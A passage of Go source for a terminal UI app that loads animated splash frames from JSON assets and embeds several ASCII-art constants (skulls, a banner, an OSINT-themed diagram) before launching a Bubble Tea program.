	if err != nil {
		return nil
	}
	lines := strings.Split(string(data), "\n")
	out := []T{}
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		var item T
		if err := json.Unmarshal([]byte(line), &item); err == nil {
			out = append([]T{item}, out...)
		}
	}
	return out
}

func loadSplashFrames() []splashFrame {
	assetPath := filepath.Join("assets", "skull_flying_frames.json")
	if frames := loadSplashAsset(assetPath); len(frames) > 0 {
		return frames
	}
	return []splashFrame{
		{
			Title:  "Operator Sigil",
			Source: "user-supplied startup ASCII",
			Art:    startupSigil,
		},
	}
}

func loadLoadingFrames() []splashFrame {
	assetPath := filepath.Join("assets", "skull_pixel_loading_frames.json")
	if frames := loadSplashAsset(assetPath); len(frames) > 0 {
		return frames
	}
	return []splashFrame{
		{
			Title:  "Pixel Skull Loader",
			Source: "embedded fallback",
			Art:    asciiSkull,
		},
	}
}

func loadSplashAsset(path string) []splashFrame {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil
	}
	var asset splashAsset
	if err := json.Unmarshal(data, &asset); err != nil {
		return nil
	}
	frames := make([]splashFrame, 0, len(asset.Frames))
	title := strings.TrimSpace(asset.Title)
	source := strings.TrimSpace(asset.Source)
	if title == "" {
		title = "Animated Splash"
	}
	if source == "" {
		source = filepath.Base(path)
	}
	for _, frame := range asset.Frames {
		if strings.TrimSpace(frame) == "" {
			continue
		}
		frames = append(frames, splashFrame{
			Title:  title,
			Source: source,
			Art:    frame,
		})
	}
	return frames
}

const juicetuiBanner = `
██╗  ██╗██████╗ ██████╗ ███████╗████████╗██╗██╗  ██╗
██║  ██║╚════██╗██╔══██╗██╔════╝╚══██╔══╝██║██║ ██╔╝
███████║ █████╔╝██████╔╝█████╗     ██║   ██║█████╔╝
██╔══██║ ╚═══██╗██╔══██╗██╔══╝     ██║   ██║██╔═██╗
██║  ██║██████╔╝██║  ██║███████╗   ██║   ██║██║  ██╗
╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚═╝╚═╝  ╚═╝
`

const fallbackASCII = `
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*` + "`" + `   ` + "`" + `"#$$$$8!!!!??!!!
             :X- M$$$$       ` + "`" + `"T#$T~!8$WUXU~
            :%` + "`" + `  ~#$$$m:        ~!~ ?$$$$$$
          :!` + "`" + `.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` + "`" + ` !    ~?T#$$@@W@*?$$      /` + "`" + `
W$@@M!!! .!~~ !!     .:XUW$W!~ ` + "`" + `"~:    :
#"~~` + "`" + `.:x%` + "`" + `!!  !H:   !WM$$$$Ti.: .!WUn+!` + "`" + `
:::~:!!` + "`" + `:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! ` + "`" + `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:` + "`" + `
?MXT@Wx.~    :     ~"##*$$$$M~
`

const asciiSkull = `
      _.--,_
   .-'      '-.
  /            \
 '          _.  '
 \      "" /  ~(
  '=,,_ =\__ ` + "`" + `  &
        "  "'; \\\
`

const pwnedSkullASCII = "" +
	"                            ,--.\n" +
	"                           {    }\n" +
	"                           K,   }\n" +
	"                          /  ~Y`\n" +
	"                     ,   /   /\n" +
	"                    {_'-K.__/\n" +
	"                      `/-.__L._\n" +
	"                      /  ' /`\\_}\n" +
	"                     /  ' /\n" +
	"             ____   /  ' /\n" +
	"      ,-'~~~~    ~~/  ' /_\n" +
	"    ,'             ``~~~  ',\n" +
	"   (                        Y\n" +
	"  {                         I\n" +
	" {      -                    `,\n" +
	" |       ',                   )\n" +
	" |        |   ,..__      __. Y\n" +
	" |    .,_./  Y ' / ^Y   J   )|\n" +
	" \\           |' /   |   |   ||\n" +
	"  \\          L_/    . _ (_,.'(\n" +
	"   \\,   ,      ^^\"\"' / |      )\n" +
	"     \\_  \\          /,L]     /\n" +
	"       '-_~-,       ` `   ./`\n" +
	"          `'{_            )\n" +
	"              ^^\\..___,.--`\n"

const skullTaxonomyASCII = `
              ___           _,.---,---.,_
              |         ,;~'             '~;,
              |       ,;                     ;,
     Frontal  |      ;                         ; ,--- Supraorbital Foramen
      Bone    |     ,'                         /'
              |    ,;                        /' ;,
              |    ; ;      .           . <-'  ; |
              |__  | ;   ______       ______   ;<----- Coronal Suture
             ___   |  '/~"     ~" . "~     "~\'  |
             |     |  ~  ,-~~~^~, | ,~^~~~-,  ~  |
   Maxilla,  |      |   |        }:{        | <------ Orbit
  Nasal and  |      |   l       / | \       !   |
  Zygomatic  |      .~  (__,.--" .^. "--.,__)  ~.
    Bones    |      |    ----;' / | \ ` + "`" + `;-<--------- Infraorbital Foramen
             |__     \__.       \/^\/       .__/
                ___   V| \                 / |V <--- Mastoid Process
                |      | |T~\___!___!___/~T| |
                |      | |` + "`" + `IIII_I_I_I_IIII'| |
       Mandible |      |  \,III I I I III,/  |
                |       \   ` + "`" + `~~~~~~~~~~'    /
                |         \   .       . <-x---- Mental Foramen
                |__         \.    ^    ./
                              ^~~~^~~~^
`

const osintNavigatorASCII = `
                           _
              .----------/ |<=== <<SEED_INPUT>>
             /           | |
            /           /| |          _________
           /           / | |         | .-----. |
          /___________/ /| |         |=|     |-|
         [____________]/ | |         |~|_____|~|
         |       ___  |  | |         '-|     |-'
         |      /  _) |  | |           |.....|
         |     |.'    |  | |           |     |<=== <<COLLECTION_LAYER>>
 <<TARGET_PROFILE>> |            |  | |    <<DISCOVERY>>  |.....|       modules
   key => |            |  | |            '--._|
         |            |  | |      |
 <<DATA_STORE>> |            |  | ;______|_________________
         |            |  |.' ____\|/_______________ '.
         |            | /|  (______________________)  )<== <<VERIFICATION_DESK>>
         |____________|/ \___________________________/  interface
         '--||----: '''''.__                      |
            || jgs '"";"""-.'-._ <== <<PIPELINE_FLOW>>  |    <<ANALYSIS_CORE>>
            ||         |     '-. '._ of operation /<== processing
    ||      ||         |        \   '-.         /       unit
  surge     ().-.      |         |      :      /'
control ==>(_((X))     |      .-.       : <======= <<REPORT_OUTPUT>>
 device       '-'      \     |   \      ;      |________
    ||                  '\  \|/   '-..-'       / /_\   /|
    ||                   /'-.____             |       / /
    ||                  /  _    /_____________|_     / /_
    ||    <<SOURCE_ADAPTERS>> ==>/_\___________________/_\__/ /~ )__
    ||      (hardware) |____________________________|/  ~   )
    ||                                     (__~  ~     ~(~~'
    ||    <<RISK_GUARDRAILS>> ===> (_~_  ~  ~_ ')
  .-''-.                                         '--~-' '
 /______\                              _________
  [____] <=== <<EVIDENCE_REVIEW>>       _|'---------'|
                                   (C|           |
                        <<ARCHIVE_PATH>> ===> \           /
 |\\\ ///|                            '========='
`

const startupSigil = fallbackASCII

func main() {
	root := ""
	if len(os.Args) > 1 {
		root = os.Args[1]
	} else {
		cwd, err := os.Getwd()
		if err != nil {
			fmt.Fprintf(os.Stderr, "cwd: %v\n", err)
			os.Exit(1)
		}
		root = cwd
	}
	if _, err := os.Stat(root); err != nil {
		fmt.Fprintf(os.Stderr, "path: %v\n", err)
		os.Exit(1)
	}
	p := tea.NewProgram(initialModel(root), tea.WithAltScreen())
	if _, err := p.Run(); err != nil {
		fmt.Fprintf(os.Stderr, "tui error: %v\n", err)
		os.Exit(1)
	}
}
